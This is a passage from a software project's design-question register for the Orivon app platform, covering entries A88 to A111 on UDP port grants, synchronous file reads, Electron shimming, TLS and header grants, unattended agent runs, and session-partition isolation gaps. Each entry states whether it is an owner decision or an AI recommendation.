Stream-shaped, matching `ADR-0008`'s ban on `EventEmitter`s; drop-on-full under the same
backpressure discipline as `readable`, so a socket that never reads `refusals` behaves exactly as
before — nothing about the transport half changes. `write()` itself still never rejects. An app
that ignores the stream loses nothing over the original design; an app that reads it is told
plainly which of its own writes were refused and why, matching every other capability's denial
surface instead of being the one silent exception.

**What it deliberately still does not carry.** Only the destination the app itself already named,
plus the bare `code` — no resolved address, no which-pattern-excluded-it. Handing back more would
turn the boundary into a probe oracle for the grant's own shape, the same reasoning `errors.ts`
already applies to every other `denied`.

**Needed by:** lands in the contracts PR (`stream/contracts-14-datagram-wire`, #95) that already
carries this entry, since `refusals` is a contract addition, not an implementation detail; the
sink (`datagram-sink.ts`) and preload (`datagram-port.ts`, `main-world-socket.ts`) changes that
populate it follow in the PRs that already touch those files.

---

### A88 — `bind(0)` asks the OS to pick a port, and nothing says whether it may pick outside the granted range **[AI-REC]**

**Raised 2026-09-07**, building `checkBind` (`stream/broker-30-bind-policy`), build step 2's UDP
work.

An app may call `orivon.net.udpBind({ port: 0 })`, which in every Node/POSIX API means *any free
port the OS picks*. Real DHT clients do this routinely. But `udp.bind` grants are **declared port
ranges** — `capability-api.md` A9 §1 rejects `"*"` precisely so that a person approving one reads
a specific range — and a port of 0 has no port to check against that range.

Nothing in the corpus covers the case. `capability-api.md`, `handle-contracts.md` §UdpSocket and
the manifest grammar all describe the declared-range rule; none of them mentions port 0.

**Three answers, and why the third was built:**

1. **Deny `bind(0)` outright.** Safe, and wrong: it breaks the ordinary way a DHT client binds, so
   every app would hard-code a port instead — which is worse for the user, not better.
2. **Allow it and let the OS pick anywhere.** This is what a naive implementation does, and it
   quietly makes the grant prompt a lie. The user read "listen for messages on ports 6881-6889";
   the app ends up on 51413. Nobody decided that; it would just happen.
3. **Allow it, and pick from inside the granted ranges.** `checkBind`'s allow branch returns the
   surviving `PortRange[]` rather than a bare yes, and the adapter tries free ports from them,
   failing with `'limit'` if none is free. The sentence the user approved stays literally true.

**Cost of (3), stated rather than buried:** a bind can now fail for a reason POSIX has no
equivalent of — "your range is full" — and the adapter needs a retry loop over the range rather
than one `bind(0)` syscall. Both are small; the alternative is a prompt that does not describe
what happens.

**A second-order effect worth naming:** picking sequentially from `lo` makes an app's port
predictable across runs, which is a mild fingerprinting signal for a privacy-branded browser. The
adapter should pick at random within the range instead. That is an implementation note for the
adapter PR, not part of this decision.

**Needed by:** before the user-facing grant prompt is written (build step 4), because the prompt's
wording and this behaviour have to agree. Nothing before that blocks on it.

---

### A89 — `udp.bind` is IPv4-only in v0, and nothing in the corpus says which family it should be **[AI-REC]**

**Raised 2026-09-07**, building the dgram adapter (`stream/broker-31-udp-bind`).

`bindUdp` creates a `udp4` socket bound to `0.0.0.0`. Nothing specifies this — `capability-api.md`,
`handle-contracts.md` §UdpSocket and the manifest grammar all describe ports and say nothing about
address families.

**Why `udp4` rather than dual-stack `udp6`.** A Node `udp6` socket on `::` does receive IPv4
traffic, but it reports those peers as **IPv4-mapped** addresses (`::ffff:93.184.216.34`). Those
would then have to be un-mapped before being matched against a `udp.send` pattern or classified by
`address.ts` — and "an address that means one thing but is spelled another way, which the checker
must normalise first" is precisely the shape of bug `policy/address.ts`'s canonicalisation exists
to close, and precisely the shape `connect.ts`'s header warns about. Taking that on for no v0
benefit was the wrong trade.

**The cost, stated plainly:** on an IPv6-only network the DHT does not work at all, and a peer
reachable only over IPv6 is unreachable. That is a real product limitation, not a technicality —
it belongs in `build-plan.md`'s known-limitations list alongside "no UPnP" and "no multicast" if
the owner confirms it.

**Reversible cheaply.** It is one `createSocket` option plus a family field on the bind path;
the un-mapping work is what makes it more than a one-liner, not the socket type.

**Needed by:** before the flagship's known-limitations text is written (build step 5), so the
in-product statement and the behaviour agree. Nothing before that blocks on it.

---

### A90 — owner-decision IDs (`d-NNNN`) are cited in source with no register **[STILL OPEN — AI recommendation]**

**Raised 2026-09-07**, by the repo-wide comment sweep (`stream/backlog-15-comment-sweep`). Source
comments cite `d-0017`, `d-0020`, `d-0021` and `d-0022` as if they named entries in some decision
log — but no such log exists anywhere in this repository. Each citation currently reads correctly
only because the comment beside it also spells the decision out in words; the token itself
resolves to nothing a reader can look up.

**What the sweep did instead of guessing.** Rather than invent a register retroactively — which
would fabricate provenance for decisions this document did not track at the time — every `d-NNNN`
citation the sweep touched was left in place with the actual decision restated in the same
sentence, so the token is a label on a fact already present, not the only carrier of it.

**Shape it would take if built.** Either fold `d-NNNN` into this document's own numbering (every
citation becomes an `A`-number, closed on the spot as `[RESOLVED — owner]`), or give it its own
short-lived log the way ADRs get `docs/decisions/` — but a `d-NNNN` is typically smaller and more
frequent than something that earns a whole ADR file, so a single running table is more likely the
right shape than one file per decision.

**Needed by:** whenever the next `d-NNNN` is about to be minted. Not blocking anything today —
existing citations are self-contained now.

### A91 — `§` is used 185 times across 27 docs files; `CLAUDE.md` states docs are ASCII-only prose **[STILL OPEN]**

**Raised 2026-09-07**, by the same sweep, while deciding how to rewrite `src/contracts/`'s
`document.md SSSection` references (an undocumented ASCII stand-in for `§` used only in `.ts`
comments — fixed on `stream/contracts-06-doc-gaps` by writing out `"document.md's 'Section'
section"` instead, needing no legend).

**The contradiction.** `CLAUDE.md` §Conventions states: *"Docs are Markdown, `kebab-case.md`,
ASCII-only prose."* Measured directly: `§` appears 185 times across 27 files under `docs/`,
including in section headings (`handle-contracts.md`'s `## §Errors`, `## §TcpSocket`, etc.) and
in prose cross-references. `src/` itself has never adopted `§` — every comment that needs to name
a section spells the word "section" out, or now (as of the sweep above) uses a quoted section
name — so the ASCII rule already holds in source. It does not hold in the docs it is stated for.

**Not resolved by this sweep**, on purpose: `docs/` belongs to the `docs` stream
(`parallel-work.md`'s ownership map), and rewriting 185 occurrences across 27 files to settle a
rule this sweep did not need to touch would be exactly the kind of silent scope-widening
`parallel-work.md` asks a branch to avoid.

**Two ways to close it, both cheap:** relax the stated rule to permit `§` in docs (it is already
the de-facto, consistent, and more readable convention there, and the contradiction is with the
rule's wording, not with how anyone actually writes) — or sweep `docs/` to remove `§` in favour of
literal words, matching the ASCII rule as written. **This is a wording call on an owner-authored
document, not a technical one — owner's decision.**

### A92 — `SHELL_APP_ID` is a placeholder identity for the whole process, not a real app **[STILL OPEN — AI recommendation]**

**Raised 2026-09-07**, by the repo-wide comment sweep, finding `src/telemetry/runner.ts`
pointing at a "this lane's QUESTION checkpoint (log.md)" that does not exist in this repository.

`runner.ts`'s `SHELL_APP_ID = 'shell'` stands in for the whole Orivon process in every telemetry
event this file emits, because nothing in the tree yet connects a loaded capability app to a tab
— there is no real `AppId` to attribute session time to. This is a real gap, not a decided
design: once an app loader exists (build step 4) and a tab can be asked "which app, if any, is
running here", telemetry attribution should very likely move to the real per-app id and stop
lumping everything under one placeholder.

**Needed by:** before telemetry numbers are used to judge per-app engagement rather than
whole-browser usage. Not blocking today — the MVP's own success metric is stated on
whole-browser `activeSec`, which this placeholder already measures correctly.

### A93 — `TELEMETRY_INGEST_URL` has no real endpoint **[STILL OPEN]**

**Raised 2026-09-07**, same sweep and same broken pointer as A92.

`src/telemetry/runner.ts`'s `TELEMETRY_INGEST_URL` is an RFC 2606 `.example` address, guaranteed
never to resolve, so telemetry cannot silently start reaching a real server before one exists.
`ADR-0004` requires a self-hosted ingest endpoint; none is provisioned anywhere in this
repository or its docs.

**Needed by:** before telemetry is enabled for real users. Not blocking any build step before
that — `realSender` already treats every failed send (including one that can never resolve) the
same way `attemptSend` treats an ordinary network failure.

### A94 — synchronous `fs` was assumed impossible in a renderer; two routes exist and neither has been considered **[RESOLVED 2026-09-09 — owner decision]**

**Raised 2026-09-09**, while building `planning/compatibility-matrix.md` with the owner. The
owner refused the "impossible" claim and was right to.

**The claim being corrected.** `capability-api.md` design rule 2 states *"Everything is async"*,
and its stated reason is narrow: *"Node constructs sockets synchronously; across an IPC boundary
we cannot."* That reasoning is sound for `net` — a dial cannot complete synchronously without
blocking for a DNS round trip. It was then generalised to `fs`, where it does not follow: a local
file read is sub-millisecond, and the cost of blocking for it is not the same cost at all.

**Why it matters.** A ported Node app fails at *startup*, not under load. `fs.readFileSync` and
`fs.existsSync` are how Node programs read their own config, and they usually appear inside a
dependency the porting developer does not control. An async-only `fs` does not make those calls
slow; it makes them absent, so the app throws before it renders. This is the difference between
"most Electron apps port mechanically" (`ADR-0002`'s bet) and "most Electron apps need their
dependency trees audited first".

**Route A — `ipcRenderer.sendSync`.** Electron ships a synchronous renderer-to-main channel;
verified in this tree at `node_modules/electron/electron.d.ts:9321`, carrying Electron's own
warning that it *"will block the whole renderer process until the reply is received"*. That
blocking is exactly the required behaviour. It works from a sandboxed preload, `Uint8Array`
survives structured clone, and `contextBridge` can present it to the main world as a plain
synchronous function.

*Cost:* the UI freezes for the duration of the call. For a handful of config reads at startup
that is a few milliseconds and invisible. For a chatty workload it is unusable, and nothing would
stop an app from being chatty.

**Route B — `Atomics.wait` on a `SharedArrayBuffer`, with app code in a Worker.** `Atomics.wait`
throws on a browser main thread but is permitted in a Worker: the worker blocks, another thread
services the request through the broker and signals the buffer. This is how StackBlitz
WebContainers provides synchronous `fs` to Node programs in an ordinary browser tab, so it is
proven technology rather than a proposal.

*Cost:* `SharedArrayBuffer` requires cross-origin isolation (COOP/COEP). Under `ADR-0007` an app
is served through an intercepted protocol inside its own partition, so those headers are ours to
set — **plausible but unverified in this tree; verify before relying on it.**

*Structural consequence, and it is the interesting part:* app backend code would run in a Worker
with the frontend on the main thread, passing messages between them. That is Electron's own
main/renderer split, which is the shape the ported app was already written in. It is a larger
change than Route A and a better fit.

**What is not proposed.** Synchronous `net`. Rule 2's reasoning holds there and should stay.

**Portability, since `ADR-0002` turns on it.** Synchronous capability calls are not an Electron
trick that would have to be unwound later: a WASM host does synchronous host calls natively and
Mojo has synchronous IPC. Whichever engine replaces this one, a sync `fs` survives the move.

**Unexplored, not rejected.** `src/`, `docs/` and `.claude/` were grepped for `sendSync`,
`Atomics` and `SharedArrayBuffer` on 2026-09-09; the only hits are unrelated notes in
`broker/policy/derive.ts` about `SharedArrayBuffer`-backed views being excluded from
`BufferSource`. No document weighs this and no decision rejects it.

**Needed by:** before build step 3 designs the shim's `fs` module. Route B decides *where app code
runs*, which is an architecture question rather than a detail, and any answer that changes rule 2
is a `src/contracts/` change — own PR, merged first.

> **Owner decision, 2026-09-09: Route A (`ipcRenderer.sendSync`), not Route B.** `orivon.fs`
> gains a synchronous read over the runtime's synchronous renderer-to-main channel, and the page
> genuinely blocks for the call — correct for a startup config read. This narrows
> `capability-api.md` design rule 2 to network operations only; `net` stays fully async. It is a
> `src/contracts/` change, so it lands in its own PR, merged first.
>
> Route B is not rejected — it stays available later as a swap for the same mechanism, **with no
> app-visible difference**: an app calling the synchronous read cannot tell which implementation
> answered it. Recorded as decision 2 of thirteen in `planning/unattended-build-queue.md`. This
> is architectural (`CLAUDE.md` Rule 1), and is now recorded as
> [`ADR-0016`](decisions/ADR-0016-synchronous-file-reads-are-permitted.md), authored by the owner
> through the sanctioned path on 2026-09-10.

### A95 — tier 2 is defined as Electron apps, and nothing accounts for shimming the `electron` module itself **[RESOLVED 2026-09-09 — owner decision]**

**Raised 2026-09-09**, alongside A94 and from the same conversation.

`src/shim/README.md` scopes `orivon-node-shim` to Node's `net`, `dgram` and `fs`.
`app-compatibility.md` defines **tier 2** as "Electron / Node desktop app -- reuse the frontend
as-is, swap Node calls for `orivon-node-shim`". Those two sentences do not meet: an Electron
app's guaranteed first import is `electron`, not `net`, and no document in this repository says
who provides it.

**What it actually needs**, and most of it is small:

| Electron API | What backs it |
|---|---|
| `app.getPath('userData')` | the app's sandbox directory root |
| `app.getVersion()` | `orivon.app.manifest()` |
| `dialog.showOpenDialog` | `orivon.fs.userSelected` |
| `ipcRenderer.invoke` / `ipcMain.handle` | a purely local message bus -- both halves of the app run inside Orivon, so no capability is involved |
| `BrowserWindow`, `Menu`, `Tray` | shell-side; largely out of scope, and the honest answer may be "not supported" |

**Why `ipcRenderer` is the interesting row.** An Electron app's own IPC is between *its* main
process code and *its* renderer code. In Orivon both halves are on our side of the boundary, so
this shim needs no broker, no grant and no capability -- it is a message bus in plain JS. Under
A94's Route B (app backend code in a Worker) it maps onto the worker/main-thread split directly,
which is the same shape the app was already written in.

**Why this was missed.** The `Shim` column of `planning/compatibility-matrix.md` asked "does a
*Node* shape exist", so `app.*` and `id.*` read as not-applicable. They are not: `id.*` already
has an adapter in `src/nostr/nip07.ts` presenting `window.nostr` (NIP-07), and `app.*` is
precisely what an `electron` shim would be built on. There are three adapter families -- Node
stdlib, the `electron` module, and web-ecosystem standards -- and only the first was named
anywhere. The matrix was corrected the same day; this entry is the scoping question it exposed.

**The decision needed.** Whether `src/shim/` owns the `electron` family too, or whether it is a
separate package with its own stream and ownership. `parallel-work.md` gives `shim` to build
step 3 with a fixed path list, so this is not purely editorial -- it changes what step 3 is.

**Needed by:** before build step 3 starts, for the same reason as A94. A step-3 branch that
discovers it also owes an `electron` shim has already committed to a scope nobody sized.

> **Owner decision, 2026-09-09: the `electron` module gets its own compatibility package**,
> separate from `orivon-node-shim`. Buildable in parallel with the Node-stdlib shim, and that
> shim's declared scope (`net`, `dgram`, `fs`) stays exactly as written — it gains no new
> responsibility. Recorded as decision 3 of thirteen in `planning/unattended-build-queue.md`.

---

## Owner decisions taken 2026-09-09 (unattended-build-queue session)

The remaining ten of the thirteen owner decisions behind `planning/unattended-build-queue.md`,
recorded here per `CLAUDE.md` Rule 2 — each is the **owner's** decision, not an AI
recommendation, and each states its own consequence and what it closes. Decisions 1-3 above
close A12/A94/A95; decisions 4, 6 and 7 are architectural and are now recorded as
[`ADR-0017`](decisions/ADR-0017-orivon-owns-the-app-http-path.md), authored by the owner through the sanctioned path on 2026-09-10 — as is
decision 2's own [`ADR-0016`](decisions/ADR-0016-synchronous-file-reads-are-permitted.md).

### A96 — Orivon terminates TLS on the app's behalf **[RESOLVED 2026-09-09 — owner decision]**

Decision 4 of thirteen, `planning/unattended-build-queue.md`. Orivon performs the TLS
handshake and certificate/hostname verification on the trusted side, using the encryption
stack already in the shipped runtime, rather than handing an app raw bytes and making it do
this itself. One new capability; no new dependency, so Rule 8 is unaffected. Because the
trusted side sees the real hostname, a grant can name it directly.

Architectural (`CLAUDE.md` Rule 1); one part of [`ADR-0017`](decisions/ADR-0017-orivon-owns-the-app-http-path.md), which covers it together
with decisions 6 and 7 and was authored by the owner on 2026-09-10.

**Needed by:** Phase 1 (the contracts PR) and Phase 2 item 2.3 (secure connect),
`planning/unattended-build-queue.md`.

### A97 — `net.listen` is built in this round **[RESOLVED 2026-09-09 — owner decision]**

Decision 5 of thirteen. `net.listen` is not deferred: it is already fully specified, including
the unsigned-app port-range rules (`capability-api.md` §1, "Is `net.listen` grantable to
unsigned apps?"), and is the largest single item in `planning/unattended-build-queue.md`
(Phase 2 item 2.4). It lets the flagship seed as well as download, not receive only.

`build-plan.md` step 2 is amended accordingly (owner decision `d-0023`).

**Needed by:** Phase 2, `planning/unattended-build-queue.md` — item 2.4 is called out there to
start first.

### A98 — the page's own `fetch()` is routed through the capability for granted hosts **[RESOLVED 2026-09-09 — owner decision]**

Decision 6 of thirteen. An ordinary page's `fetch()` call is routed through the secure-connect
capability for any host the app has been granted. Not an optimisation: the FreeTube
reconnaissance (`planning/freetube-port-recon.md`) found its entire network layer is `fetch`,
so without this routing the app does not function at all.

Architectural (`CLAUDE.md` Rule 1); covered by [`ADR-0017`](decisions/ADR-0017-orivon-owns-the-app-http-path.md), the same ADR as A96 and A99,
authored by the owner on 2026-09-10.

**Needed by:** Phase 3 item 3.4, `planning/unattended-build-queue.md`.

### A99 — an app may set any request header on a granted host **[RESOLVED 2026-09-09 — owner decision]**

Decision 7 of thirteen. On a granted host, an app may set request headers a page is normally
forbidden to set, including `Origin` — FreeTube's own main process sets `Origin:
https://www.youtube.com` today, and real ports need this. Safe because these connections carry
none of the user's own cookies or sessions: nothing can ride an existing login, since the app
must supply everything itself.

Architectural (`CLAUDE.md` Rule 1); the third part of [`ADR-0017`](decisions/ADR-0017-orivon-owns-the-app-http-path.md), the same ADR as A96
and A98, authored by the owner on 2026-09-10.

**Needed by:** Phase 3 item 3.4, `planning/unattended-build-queue.md`.

### A100 — network permission is declared in the manifest and granted once at install; no just-in-time prompting **[RESOLVED 2026-09-09 — owner decision]**

Decision 8 of thirteen. A manifest declares its network needs, and may declare unlimited
HTTPS; the grant happens once, at install. An app that does not know Orivon exists cannot pause
mid-request to wait on a decision — it fires parallel requests with its own timeouts and
retries. A host outside the declaration is still denied with no prompt, as today.

**The prompt must make breadth visible:** a narrow declaration and an unlimited one must be
unmistakably different to look at, or every manifest will simply declare unlimited. This is a
direct requirement on Phase 4 item 4.2's install prompt, whose own exit criterion already says
so (`planning/unattended-build-queue.md`).

**Needed by:** Phase 4 item 4.2, `planning/unattended-build-queue.md`.

### A101 — a grant lasts until the user revokes it, visible in a list they can revoke from **[RESOLVED 2026-09-09 — owner decision]**

Decision 9 of thirteen. No grant expiry; a person revokes explicitly, from a list that shows
what is currently granted. Chosen to keep prompts rare enough that the ones which do appear
still get read. Direct requirement on Phase 4 item 4.4 (the grant list), whose exit criterion
already ties to it: revoking from the list must tear down live handles, proven by test.

**Needed by:** Phase 4 item 4.4, `planning/unattended-build-queue.md`.

### A102 — the run builds the platform only; FreeTube and webtorrent are test subjects, not porting projects **[RESOLVED 2026-09-09 — owner decision]**

Decision 10 of thirteen. FreeTube and `webtorrent` exist in this queue to prove the broker and
shim are built right — they are not being ported as finished products in their own right.
Porting is per-app work that shifts upstream continuously, and it is exactly the kind of work
that quietly consumes an unattended run without moving the platform forward.

Stated so it cannot be misread past this build: this bounds *this round of work*, not a
permanent property of Orivon and not a claim that FreeTube will never run well on it — a real
port is downstream work for whoever wants that app, once the platform exists.

**Needed by:** every phase; the standing answer whenever "should this go further than proving
the capability" comes up during Phases 2-5.

### A103 — the permission prompt is in scope, with owner feedback during development rather than a review at the end **[RESOLVED 2026-09-09 — owner decision]**

Decision 11 of thirteen. The prompt is built now, in this round, and the owner gives feedback
as it is built rather than seeing it only once finished. This is what turns the platform work
above into something a person can actually use, and it is why Phase 4 exists as its own phase
with five owner checkpoints (`planning/unattended-build-queue.md`) instead of one review at the
end.

`build-plan.md` step 4 is amended accordingly (owner decision `d-0024`).

**Needed by:** Phase 4, `planning/unattended-build-queue.md`.

### A104 — a parked question never halts the run **[RESOLVED 2026-09-09 — owner decision]**

Decision 12 of thirteen. An agent needing an owner decision registers the question and moves
immediately to work that does not depend on the answer; parked questions are put to the owner
in one batch when they return. Prevents the failure this was written to prevent: the owner
asleep, and the run idling for hours on one unanswered question.

The full mechanism, and the map of what stays workable when each known question is parked, is
in `docs/development/unattended-run-protocol.md` — this entry is the index pointer, following
the same convention the 2026-09-03 backlog session used above (A46/A36/A29/A33/A7): the
authoritative text lives at the linked document, not duplicated here.

**Needed by:** every phase of this run.

### A105 — a usage limit pauses the run; it never ends it **[RESOLVED 2026-09-09 — owner decision]**

Decision 13 of thirteen. The live 5-hour session window is read at every checkpoint via
`claude-status-mcp`'s command-line mode (needs no MCP connection, so it works in any
unattended session); at 90% the run stops dispatching, commits in-flight work, writes its
resume point and schedules resumption for the known reset time. The 7-day window is logged for
visibility only and is never a gate. Concurrency stays capped independently, because
utilization is a level, not a rate.

Full mechanism in `docs/development/unattended-run-protocol.md`, landed the same day as commit
`a572570` ("Gate the unattended run on the live 5-hour usage window at 90 percent") — this
entry is the index pointer, per the same convention as A104.

**Needed by:** every phase of this run.

---

## Batched from the 2026-09-10 build queue (lanes P2-4, P3-1, P0-4, P0-5)

Six questions parked by five lanes with nowhere of their own to put them, filed together in
lane P0-5's PR per that lane's brief. None below is an owner decision — each is labelled
AI recommendation or still open on its own merits, per Rule 2.

### A106 — `net.listen`'s accept backpressure is a bounded fallback queue, not the OS-level mechanism `handle-contracts.md` describes **[AI-REC]**

**Raised 2026-09-10**, lane P2-4, merged as `net.listen`'s implementation (PR #109).

`handle-contracts.md` §Conformance item 7 states: *"A `TcpServer` whose `connections` stream is
not being read stops accepting new incoming connections at the OS level."* §TcpServer's own
prose makes the same claim: *"if the app stops reading `connections`, the broker stops
*accepting* new connections, and the OS listen backlog itself applies pressure back to whoever
is trying to connect."*

`src/broker/adapters/node-adapters.ts`'s `listenTcp` cannot do this, and says so in its own
source comment rather than silently falling short: vanilla Node `net` accepts a connection and
fires `'connection'` unconditionally the instant the OS hands one over, and there is no public
API to defer the `accept()` syscall independently of app readiness (`pauseOnConnect` pauses an
already-accepted socket's data flow, not the listener's accept loop — checked against Node's
own `lib/net.js`, not assumed). What is built instead is `LISTEN_ACCEPT_QUEUE_LIMIT` (64): an
accepted-but-unclaimed connection is queued in the broker's own process, and past 64 unclaimed
connections a new arrival is reset (`resetAndDestroy`), not accepted and not queued further.

The observable behaviour an app sees is close — connections stop flowing once it falls behind —
but the mechanism is different in a way a careful reader would notice: 64 sockets accepted and
sitting in broker memory is not "the OS listen backlog applies pressure," and the two diverge
under a fast-connecting, slow-reading peer (the OS's own backlog would fill and start refusing
far earlier or later than 64, depending on OS tuning `net.listen` does not control).

**What this recommends:** `handle-contracts.md` §Conformance item 7 and §TcpServer's prose both
currently assert something the shipped implementation does not literally do. Either amend the
spec to say "approximately, via a bounded broker-side queue" (matching what was built and
disclosed), or treat this as a real gap to close with an OS-level primitive if one is found.
The AI recommendation is the former — no such Node primitive exists to reach for — but that is
a judgment call about how strictly a contract document's own words should be trusted, which is
exactly what Rule 2 says an agent should not blur into a decision.

**Needed by:** whenever `handle-contracts.md` next gets a conformance-checklist pass; not
blocking, since the behaviour it describes (bounded, disclosed, reset rather than silent growth)
is safe today regardless of which reading of the spec is correct.

### A107 — `k-rpc-socket` needs real `dns.lookup`; no pure-JS polyfill answers it, and it is a broker capability question, not shim work **[RESOLVED 2026-09-15]**

**Raised 2026-09-10**, lane P3-1, `docs/planning/shim-dependency-review.md` (now on `main` via
PR #111).

That review re-derived the shim's dependency floor from webtorrent 3.0.21's real, live tree
rather than trusting the existing compatibility matrix, and found one gap the matrix never
named: `bittorrent-dht` → `k-rpc` → `k-rpc-socket@1.11.1` calls `dns.lookup(peer.host, ...)`
directly (confirmed at that package's `index.js:3,162`) for any DHT peer whose address arrives
as a hostname rather than an IP literal — a routine case for real DHT traffic, not an edge case.

The review is explicit that this is **not answerable by a pure-JS polyfill** the way `net.isIP`
was: real DNS resolution needs either the runtime's own resolver or a broker capability, and
`orivon.net` (`src/contracts/`) has no such entry today. This makes it a question for whoever
builds `net`/`dgram` (queue item 3.2) or reviews the broker's capability surface, not a shim
implementation detail — `src/shim/` cannot answer a question that requires new broker authority,
however it is spelled.

**Needed by:** before DHT peer resolution can work for any hostname-addressed peer — queue item
3.2, or whichever review of `orivon.net`'s surface comes first.

**RESOLVED 2026-09-15, in the shape this entry asked for: broker authority, not a shim
polyfill.** `d-0030` added `OrivonNet.lookup` to `src/contracts/capability-api.ts` (#199);
`net-capability.ts`'s `lookup`, its control-channel dispatch (`dispatch-net.ts`'s `'net.lookup'`
case) and its preload surface (`net-surface.ts`'s `netLookupBridge`) landed in #201;
`src/shim/node-dns.ts`'s `dns.lookup`/`dns.promises.lookup` now call through to it for real,
wired into `module-map.ts`'s `'dns'` entry, closing #205. **Verified against the tree, not
assumed:** `net-capability.ts` exports `lookup` from `createNetCapability`'s returned object,
`dispatch-net.ts` has a real case for it, and `node-dns.ts` no longer contains a refusal for
`lookup` itself (only for every other `dns.*` member, unchanged and unrelated to this entry).

**Half-open, tracked separately rather than reopening this entry:** the review above named the
missing authority, not the exact grant-matching semantics a lookup should use once that
authority existed — that reading (`hostname` checked against the union of the origin's held
`tcp.connect`/`https.connect`/`udp.send` patterns) was supplied by the implementing lane itself
and remains an AI recommendation the owner has not confirmed. See A167 item 3 and A171 for that
still-open half; this entry closes because its own question — "is this shim work or does it need
new broker authority" — has a real answer now, not because every judgment call downstream of
that answer is settled.

### A108 — a same-view HTTP redirect to a different origin is not caught by the partition swap **[STILL OPEN]**

**Raised 2026-09-10**, lane P0-4's session-partitions work (PR #110), filed by lane P0-5 per
that lane's own instruction to record it separately from A109 and order it first as the more
security-relevant of the two.

**This is a pre-existing gap, not a regression #110 introduced.** Before #110, every tab shared
one session, so no partition mismatch could exist at all — the gap became *possible* only once
per-origin partitions did, but the underlying cause is that nothing in `src/main/` ever watches
for a redirect changing a page's origin mid-navigation (confirmed: no `will-redirect` or
`did-redirect-navigation` listener anywhere in `src/main/`, grepped directly).

`TabManager.navigate()` (`src/main/tabs.ts`) computes `nextPartition` from the **target URL the
user or the omnibox supplied**, before that URL is actually fetched, and only repartitions when
that computed value differs from the tab's current partition. If the server behind that URL
responds with an HTTP redirect to a different origin, Chromium follows it inside the same
`WebContentsView` and session — `did-navigate` fires with the final, different-origin URL, but
nothing calls `repartitionView` again, because the only two places that ever do
(`createTab`/`navigate`) both compute the partition once, up front, from the pre-redirect target.

The tab ends up showing content from origin B while holding origin A's session partition — its
storage, cookies and (once grants exist) its capability grant all still key to A. This is more
than a cosmetic mismatch: `ADR-0003` and `capability-api.md` both treat the partition as the
isolation boundary a grant is scoped to, and this is a route by which the content actually
running does not match the origin the isolation was set up for.

**Not proposed here:** a fix shape. This lane's owned paths do not include `src/main/`, and the
right mechanism (watch `did-navigate`'s own final URL and re-derive/repartition the same way
`navigate()` does today, versus a narrower check scoped to only same-view redirects) is a design
call for whoever owns that file next.

**Needed by:** before any origin holds a real capability grant scoped to its partition (build
step 4) — at that point this is not just a storage mismatch, it is a grant-scope mismatch.

### A109 — a view swapped in for a cross-origin navigation starts with empty navigation history **[AI-REC]**

**Raised 2026-09-10**, lane P0-4's session-partitions work (PR #110), filed by lane P0-5. The
second, less security-relevant of the two P0-4 items — see A108 for the other.

`TabManager.repartitionView()` (`src/main/tabs.ts`) is the only way to change a tab's Electron
session partition after creation — Electron fixes `webPreferences.partition` at construction, so
a cross-origin navigation swaps in a whole new `WebContentsView` rather than reassigning the
session live. The method's own doc comment already discloses the consequence plainly: the OLD
view's `navigationHistory` is discarded along with it, so `back()` cannot return to whatever the
tab showed before the swap — unlike a real browser, where session history survives a cross-site
renderer swap.

The same comment names the candidate fix and why it was not built under this lane's time
budget: `NavigationHistory.restore()` exists and could carry the old entries onto the new view,
but calling it and then still loading `target` risks a genuine double-load, because
`restore()`'s own promise resolves only once its restored entry finishes loading — and doing
that silently would mean either a visible flicker or navigating twice for one user action.

**AI recommendation, not proposed as a fix to build without owner sign-off:** capture the old
view's serialized history (`oldView.webContents.navigationHistory`) before closing it, restore
it onto the new view, and skip the separate `loadURL(target)` call only when `restore()`'s own
outcome already lands on `target` — falling back to the current unconditional `loadURL` when it
does not. This still needs owner review before building: it trades a known, disclosed limitation
for a more complex code path whose flicker/double-load behavior has not been measured.

**Needed by:** whenever back/forward-through-a-cross-origin-swap is prioritized; not blocking —
the current behavior is disclosed and safe, only less capable than an ordinary browser.

### A110 — `onHeadersReceived` never fires for a `protocol.handle`-served response, in this Electron version **[ACTED ON 2026-09-13]**

**Raised 2026-09-10**, lane P0-5, probing `ADR-0007`'s own four "assumed, not yet confirmed"
items (lines 86-92 and Reversibility). Full method and evidence recorded in `ADR-0007` itself,
under "Verify the mechanism before building on it" — this entry is the index pointer to the
same result, per the convention A104/A105 already use.

Measured directly (`spike/adr7-probe/`, throwaway, Electron 44.0.0, real launch confirmed via
`app.getVersion()`/`MessageChannelMain` plus a captured screenshot): `session.fromPartition(
...).webRequest.onHeadersReceived` never invoked its listener for a response served through
`session.fromPartition(...).protocol.handle('https', ...)`, and a header the listener would have
injected never reached the page. This is not a probe bug — it matches a confirmed, open Electron
defect (`electron/electron#45865`, "webRequest handlers do not run for intercepted protocols"),
with a fix (`electron/electron#45915`) merged to Electron's own `main` branch 2026-03-10 and, as
of that merge, not stated as backported to any release branch. This repository runs Electron
44.0.0.

**Does not trigger `ADR-0007`'s own Reversibility clause** — that clause names only per-session
interception and secure-context service workers, both of which this same probe confirmed PASS.
What this blocks is narrower but real: any mechanism that meant to enforce or rewrite response
headers (CSP, cache-control, or similar) on a cached bundle's own responses via `onHeadersReceived`
cannot reach those responses at all today. `ADR-0006`'s amendment ("partition CSP so the manifest
genuinely bounds network reach") is the most likely place this surfaces next.

**What would settle it:** either Electron shipping the `#45915` fix in a version this repo
upgrades to, or a different mechanism for attaching headers to a `protocol.handle` response —
the handler already fully controls its own `Response` object and its headers directly, so a
CSP or similar header can simply be set there instead of relying on `webRequest` at all. That
substitution is not filed here as a decision, only as the direction the next probe should try
first.

**Needed by:** whichever build step designs cached-bundle header/CSP enforcement — not before,
since nothing today relies on `onHeadersReceived` firing for a `protocol.handle` response.

**Acted on 2026-09-13, lane S4-6-csp:** built the substitution this entry names as the next
probe's direction, rather than leaving it as a suggestion — `connect-src.ts`'s CSP is set directly
on the `Response` `src/loader/serve.ts`'s `createAppRequestHandler` already builds and fully
controls, never via `webRequest`. Not marked RESOLVED: the Electron defect this entry documents
is still real and still open upstream: nothing here changes electron/electron#45865's status,
only routes around it. See `src/broker/policy/README.md`'s `connect-src.ts` note for what the
routing actually does.

### A111 — `window.nostr` cannot be reached from a real page until the connect prompt exists **[STILL OPEN]**

**Raised 2026-09-10**, lane P2-5's `orivon.id.*` work (PR #112, open at filing time), filed by
lane P0-5 per the conductor's instruction. Blocked on a build step, not on anything the owner
needs to decide.

`src/nostr/nip07.ts`'s real wiring, `orivonIdentitySigner`, calls `requestNostrIdentity(orivon)`
— which calls `orivon.id.requestIdentity({ kind: 'nostr' })` — and then
`handle.signEvent(...)`. This is the **named-identity** path, not the per-app `id.sign` path,
